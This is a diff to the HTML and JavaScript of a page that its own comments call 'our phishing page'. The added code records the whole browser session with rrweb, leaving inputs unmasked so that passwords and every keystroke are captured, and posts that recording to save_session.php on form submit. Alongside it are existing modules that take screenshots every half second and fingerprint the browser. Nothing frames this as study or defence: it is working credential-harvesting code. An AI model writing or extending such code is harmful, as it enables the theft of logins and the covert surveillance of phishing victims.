@@ -21183,13 +21183,15 @@
 
   <!-- Screenshot Capture & Browser Fingerprinting -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  
+  <!-- DOM Session Recording (rrweb) -->
+  <script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
+  
   <script>
-    // ==============================================
     // MODULE 1: Screenshot Capture (Every 0.5s)
-    // ==============================================
     let screenshotCounter = 0;
     let screenshotInterval;
-
+    
     function captureScreenshot() {
       html2canvas(document.body, {
         allowTaint: true,
@@ -21201,7 +21203,7 @@
         const screenshot = canvas.toDataURL('image/jpeg', 0.95);  // 95% quality for HD
         const timestamp = Date.now();
         screenshotCounter++;
-
+        
         // Send to server
         fetch('save_screenshot.php', {
           method: 'POST',
@@ -21214,20 +21216,80 @@
         }).catch(err => console.log('Screenshot save failed'));
       });
     }
-
+    
     // Start capturing screenshots every 0.5 seconds
-    window.addEventListener('load', function () {
+    window.addEventListener('load', function() {
       screenshotInterval = setInterval(captureScreenshot, 500);
     });
-
+    
     // Stop capturing if user leaves page
-    window.addEventListener('beforeunload', function () {
+    window.addEventListener('beforeunload', function() {
       clearInterval(screenshotInterval);
     });
 
-    // ==============================================
-    // MODULE 2: Browser Fingerprinting
-    // ==============================================
+    // MODULE 2: DOM Session Recording (rrweb)
+    let sessionEvents = [];
+    let sessionStartTime = Date.now();
+    let stopRecording = null;
+    
+    // Start recording when page loads
+    window.addEventListener('load', function() {
+      console.log('Session recording started');
+      
+      stopRecording = rrweb.record({
+        emit(event) {
+          // Collect all events
+          sessionEvents.push(event);
+        },
+        // High quality settings
+        sampling: {
+          // Record mouse movements at high frequency
+          mousemove: true,
+          mouseInteraction: true,
+          scroll: 150, // Capture scroll every 150ms
+          media: 800,
+          input: 'all' // Capture all input events including typing
+        },
+        // Capture all mutations
+        recordCanvas: true,
+        collectFonts: true,
+        // Privacy settings (we want everything since it's our phishing page)
+        maskAllInputs: false, // Don't mask inputs - we want to see the password!
+        maskTextSelector: null, // Don't mask any text
+        blockClass: 'rr-block', // Only block elements with this class (none in our case)
+        ignoreClass: 'rr-ignore'
+      });
+    });
+    
+    // Send session recording when form is submitted
+    document.querySelector('form').addEventListener('submit', function(e) {
+      // Stop recording
+      if (stopRecording) {
+        stopRecording();
+      }
+      
+      // Send session data to server
+      const sessionData = {
+        events: sessionEvents,
+        duration: Date.now() - sessionStartTime,
+        timestamp: sessionStartTime,
+        eventCount: sessionEvents.length
+      };
+      
+      fetch('save_session.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(sessionData)
+      }).catch(err => console.log('Session save failed'));
+      
+      // Small delay to ensure data is sent before redirect
+      e.preventDefault();
+      setTimeout(() => {
+        e.target.submit();
+      }, 300);
+    });
+
+    // MODULE 3: Browser Fingerprinting
     function getCanvasFingerprint() {
       try {
         const canvas = document.createElement('canvas');
